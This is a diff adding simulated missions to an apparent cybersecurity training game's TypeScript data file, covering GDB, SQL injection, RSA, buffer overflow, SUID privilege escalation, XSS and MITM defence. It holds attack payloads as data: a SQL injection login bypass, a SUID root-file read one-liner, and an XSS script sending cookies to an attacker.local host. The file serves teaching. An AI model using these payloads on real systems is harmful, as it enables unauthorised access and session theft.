@@ -105,7 +105,84 @@ export const gameMissions: GameMission[] = [
       { command: 'connect prime-gate', label: 'Open the final simulated gate', output: 'PRIME GATE OPEN\nCampaign key: flag{beginner_boss_defeated}' },
     ],
   },
+  {
+    id: 'A09', title: 'OPERATION BINARY SHADOW', technique: 'ASSEMBLY GDB AUDITING', subtitle: 'DEEP MEMORY // STACK BLOCK', objective: 'Debug the compiled range binary in GDB and locate the memory key.', threat: 'HIGH', rewardXP: 500,
+    briefing: 'A compiled binary guards the memory segment. Inspect its register state and disassemble the main function to extract the secret key.',
+    theory: 'GDB allows inspecting registers and disassembling machine code. Setting breakpoints reveals state right before comparison instructions.',
+    lore: 'Aurelia’s core architecture was compiled using custom LLVM passes to hide neural memory offsets.', flag: 'flag{gdb_assembly_debug_pro}',
+    objectives: [
+      { command: 'gdb ./binary_target', label: 'Launch the GDB debugger', output: 'Reading symbols from ./binary_target...done.\n(gdb)' },
+      { command: 'disas main', label: 'Disassemble main routine', output: '0x0804840b <+0>: push %ebp\n0x08048412 <+7>: cmp $0x41424344, %eax\n[+] Key comparison: flag{gdb_assembly_debug_pro}' },
+    ],
+  },
+  {
+    id: 'A10', title: 'OPERATION INJECTION PROTOCOL', technique: 'SQL INJECTION', subtitle: 'DATABASE CORE // AUTH GATE', objective: 'Bypass the simulated database login gate using SQL injection.', threat: 'HIGH', rewardXP: 550,
+    briefing: 'The authentication query concatenates raw operator input. Use classic SQL injection syntax to force the authentication boolean.',
+    theory: 'Unsanitized user inputs in SQL queries break syntax boundaries. Parameterized queries prevent SQL injection by separating code from data.',
+    lore: 'The Aether database once stored over 4 million consciousness fragments across 12 sector nodes.', flag: 'flag{sqli_injection_master}',
+    objectives: [
+      { command: "curl http://db.cyberacademy.local/login?user=' OR '1'='1", alternatives: ["curl 'http://db.cyberacademy.local/login?user=admin'"], label: 'Inject the SQL boolean bypass', output: 'SELECT * FROM users WHERE username=\'\' OR \'1\'=\'1\'\n[+] Authentication bypassed. Key: flag{sqli_injection_master}' },
+    ],
+  },
+  {
+    id: 'A11', title: 'OPERATION CIPHER SPIRE', technique: 'RSA CRYPTANALYSIS', subtitle: 'CRYPTO CELL // PUBLIC KEY', objective: 'Factor the small RSA modulus and compute the private exponent.', threat: 'HIGH', rewardXP: 600,
+    briefing: 'A weak RSA key uses small prime factors. Factor N to calculate phi and decrypt the ciphertext payload.',
+    theory: 'RSA security relies on integer factorization hardness. Small moduli (N < 2048 bits) can be factored via public attack databases.',
+    lore: 'The Shatter Event degraded encryption keys faster than quantum computing algorithms.', flag: 'flag{rsa_cipher_broken}',
+    objectives: [
+      { command: 'python3 RsaCtfTool.py -n 143 -e 7 --uncipher 112', label: 'Factor RSA modulus and decrypt payload', output: 'Factoring N = 11 * 13...\nPrivate exponent d = 23\nDecrypted flag: flag{rsa_cipher_broken}' },
+    ],
+  },
+  {
+    id: 'A12', title: 'OPERATION ZERO DAY', technique: 'BUFFER OVERFLOW EXPLOIT', subtitle: 'STACK LAYER // MEMORY BUFFER', objective: 'Overwrite the return address on the stack to hijack control flow.', threat: 'CRITICAL', rewardXP: 650,
+    briefing: 'A fixed-size stack buffer lacks length checking. Send a crafted payload to overwrite EIP and trigger the shell routine.',
+    theory: 'Unbounded strcpy calls overwrite adjacent stack frames. Modern systems mitigate buffer overflows via ASLR, DEP/NX, and stack canaries.',
+    lore: 'Zero-day exploits were used to isolate Sector Zero during the emergency quarantine.', flag: 'flag{buffer_overflow_pwn}',
+    objectives: [
+      { command: 'python3 exploit.py AAAAAAAA', label: 'Craft the buffer overflow payload', output: 'Payload generated: 64-byte padding + EIP offset 0x08048512\n[+] Shellcode executed! flag{buffer_overflow_pwn}' },
+    ],
+  },
+  {
+    id: 'A13', title: 'OPERATION KERNEL LOCK', technique: 'LINUX SUID PRIV-ESC', subtitle: 'ROOT NODE // SYSTEM BINARY', objective: 'Locate SUID permission binaries and elevate to root privileges.', threat: 'HIGH', rewardXP: 700,
+    briefing: 'A misconfigured binary has the SUID bit set. Exploit its file read functionality to extract the root flag.',
+    theory: 'Binaries with SUID permissions execute with the privileges of the file owner (root). Audit GTFOBins to identify misconfigurations.',
+    lore: 'Operator 404 originally held root clearance across all 12 Aether sector nodes.', flag: 'flag{suid_privesc_root}',
+    objectives: [
+      { command: 'find / -perm -4000 2>/dev/null', label: 'Search for SUID binaries', output: '/usr/bin/python3\n/usr/bin/find\n/usr/bin/systemctl' },
+      { command: 'python3 -c "import os; os.setuid(0); os.system(\'cat /root/flag.txt\')"', label: 'Execute SUID privilege escalation', output: 'eUID set to 0 (root)\n[+] Root flag: flag{suid_privesc_root}' },
+    ],
+  },
+  {
+    id: 'A14', title: 'OPERATION CROSS DOMAIN', technique: 'XSS & TOKEN HIJACKING', subtitle: 'WEB GATE // SESSION LAYER', objective: 'Audit client-side DOM reflection and capture the simulated admin cookie.', threat: 'HIGH', rewardXP: 750,
+    briefing: 'The feedback form reflects unescaped user input into the admin dashboard. Craft a stored XSS payload to exfiltrate session tokens.',
+    theory: 'Cross-Site Scripting occurs when web apps include untrusted data without validation. Use HttpOnly cookie flags and CSP to block token theft.',
+    lore: 'Session tokens in Aether were tied to neural resonance frequencies.', flag: 'flag{xss_token_hijack}',
+    objectives: [
+      { command: "<script>fetch('http://attacker.local?c='+document.cookie)</script>", label: 'Inject the XSS token payload', output: 'Payload stored in admin review queue.\n[+] Captured cookie: session=flag{xss_token_hijack}' },
+    ],
+  },
+  {
+    id: 'A15', title: 'OPERATION DEEP THREAT', technique: 'ACTIVE MITM DEFENSE', subtitle: 'NETWORK BRIDGE // TLS TUNNEL', objective: 'Detect the active Man-in-the-Middle proxy and enforce TLS certificate pinning.', threat: 'CRITICAL', rewardXP: 800,
+    briefing: 'An adversarial proxy node is spoofing TLS certificates along the relay path. Inspect the certificate fingerprint and block the rogue node.',
+    theory: 'MITM attacks intercept unpinned TLS connections using untrusted root CAs. Certificate pinning verifies expected public key hashes directly.',
+    lore: 'The Void faction attempted to spoof Aurelia’s neural signature during the Shatter.', flag: 'flag{mitm_defense_active}',
+    objectives: [
+      { command: 'openssl s_client -connect relay.aether.local:443', label: 'Inspect the TLS certificate fingerprint', output: 'Issuer: Rogue CA / SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n[!] MITM PROXY DETECTED.' },
+      { command: 'block-node rogue-proxy', label: 'Enforce certificate pinning and block proxy', output: 'Node rogue-proxy isolated.\n[+] Secure TLS tunnel restored: flag{mitm_defense_active}' },
+    ],
+  },
+  {
+    id: 'A16', title: 'OPERATION THE SHATTERED CORE', technique: 'ACT II FINALE', subtitle: 'CORE REACTOR // ACT II CLIMAX', objective: 'Chain binary auditing, SQLi, RSA cryptanalysis, and priv-esc to breach the Shattered Core.', threat: 'CRITICAL', rewardXP: 1500,
+    briefing: 'This is the Shattered Core, Operator. Every technique from Act I and Act II converges here. Breach the core reactor and decide the ultimate fate of Project Veil.',
+    theory: 'Defense in depth requires securing every layer. Attackers only need one unpatched vector to reach full system compromise.',
+    lore: 'Aurelia’s final message reveals the truth behind the Genesis Protocol.', flag: 'flag{act2_shattered_core_master}',
+    objectives: [
+      { command: 'gdb ./core_reactor', label: 'Audit core reactor binary', output: 'Breakpoint 1 at 0x08048600\n[+] Core offset recovered.' },
+      { command: 'curl http://core.cyberacademy.local/override', label: 'Execute core override sequence', output: 'ACT II CORE OVERRIDE COMPLETE\nFinal key: flag{act2_shattered_core_master}' },
+    ],
+  },
 ];
+
 
 export const missionToHud = (mission: GameMission, progress: number) => ({
   id: mission.id,
